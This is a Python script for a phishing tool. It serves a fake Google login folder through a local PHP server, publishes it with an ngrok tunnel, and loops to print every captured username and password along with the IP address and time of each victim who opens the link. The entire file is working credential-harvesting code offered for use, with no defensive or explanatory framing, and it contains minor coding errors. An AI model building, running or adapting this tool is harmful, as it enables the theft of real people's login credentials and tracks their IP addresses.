from colorama import Fore 
from subprocess import Popen
import os
from pyngrok import ngrok 
import json
import time
import sys

stat_file = 0

def server():
    a=open("google/usernames.json","w")
    b=a.write("")
    a.close()
    def phpserver():
        with open("Server","w") as phplog:
            Popen(("php","-S","localhost:6060","-t","google"),stderr=phplog,stdout=phplog)
            
    phpserver()
    u=ngrok.connect(6060,"http").replace("http","https")
    print(u)



    def user():
        global stat_file
        if not str(os.stat("google/usernames.json").st_size)==stat_file:
            stat_file=str(os.stat("google/usernames.json").st_size)
            fileip=open("google/usernames.json","r")
            b=fileip.read()
            try:
                infor=json.loads(b)
                for value in infor['dev']:
                    print(Fore.GREEN+"[+] "+Fore.WHITE+"Username :"+Fore.YELLOW+value['username'])
                    print(Fore.GREEN+"[+] "+Fore.WHITE+"Password :"+Fore.YELLOW+value['password'])
                    a=open("google/usernames.json","w")
                    b=a.write()
                    a.close()
            except:
                print("")
            
    def userip():
        global stat_file
        if not str(os.stat('google/ip.txt').st_size)==stat_file:
            stat_file=str(os.stat('google/ip.txt').st_size)
            fileip=open('google/ip.txt','r')
            i=fileip.readlines()
            try:
                #i=i[-1]
                print(Fore.GREEN+"\n [!]"+Fore.LIGHTCYAN_EX+" IP: %s opened link : "%(i)+time.ctime())
                o=open('google/ip.txt','w')
                o.write("")
                o.close()
            except:
                print(" ")
            
    try:        
        while True:
            userip()
            user()
    except:
        print("\n God Lock ...:)  ")
        sys.exit()

